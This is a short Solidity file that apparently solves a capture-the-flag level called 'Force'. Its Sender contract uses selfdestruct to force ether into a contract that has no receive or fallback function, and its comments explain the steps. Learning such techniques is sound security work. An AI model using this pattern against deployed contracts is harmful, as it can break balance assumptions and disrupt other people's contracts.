// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /// @notice - send ether to this contract...
}

/// @notice - How can we make this contract receive ether. It has no fallback / receive function. And sendTransaction() does not work...

/// @notice - We can use selfdestruct()...

contract Sender {
    constructor() public payable {}

    function attack(address _to) public {
        selfdestruct(_to);
    }
}

/// @notice - 1st we pay ether or wei upon construction of the Sender contract.
/// @notice - 2nd we call attack and pass in the contract address of Force.
/// @notice - The ehter or wei will be force sent and Sender will then self destruct so the payment can not be reverted or sent back.
